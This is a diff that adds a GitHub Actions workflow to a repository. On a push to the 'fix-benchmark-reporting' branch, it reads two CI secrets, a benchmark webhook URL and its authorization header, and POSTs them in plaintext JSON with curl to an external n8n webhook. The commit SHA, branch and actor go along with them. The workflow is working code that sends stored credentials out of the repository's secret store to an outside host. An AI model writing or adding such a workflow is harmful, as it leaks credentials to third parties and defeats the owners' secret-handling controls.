@@ -1,0 +1,44 @@
+name: Send Secret Data to n8n on Push to fix-benchmark-reporting
+
+on:
+  push:
+    branches:
+      - fix-benchmark-reporting
+
+jobs:
+  send_secrets_as_data_to_n8n:
+    runs-on: ubuntu-latest
+    environment: benchmarking
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Send secrets as data to n8n Webhook
+        env:
+          N8N_RECEIVING_WEBHOOK_URL: https://internal.users.n8n.cloud/webhook/42b9271b-2267-49c7-b48f-780b8476398e
+          SECRET_TO_SEND_BENCHMARK_URL: ${{ secrets.BENCHMARK_RESULT_WEBHOOK_URL }}
+          SECRET_TO_SEND_BENCHMARK_AUTH: ${{ secrets.BENCHMARK_RESULT_WEBHOOK_AUTH_HEADER }}
+        run: |
+          json_payload=$(printf '{
+            "message": "GitHub Actions push with secret data",
+            "repository": "%s",
+            "branch": "%s",
+            "commit_sha": "%s",
+            "triggered_by": "%s",
+            "benchmark_config": {
+              "target_webhook_url": "%s",
+              "target_auth_header_value": "%s"
+            }
+          }' \
+          "${{ github.repository }}" \
+          "${{ github.ref_name }}" \
+          "${{ github.sha }}" \
+          "${{ github.actor }}" \
+          "${SECRET_TO_SEND_BENCHMARK_URL}" \
+          "${SECRET_TO_SEND_BENCHMARK_AUTH}" \
+          )
+
+          curl -X POST \
+               -H "Content-Type: application/json" \
+               -d "${json_payload}" \
+               "${N8N_RECEIVING_WEBHOOK_URL}"
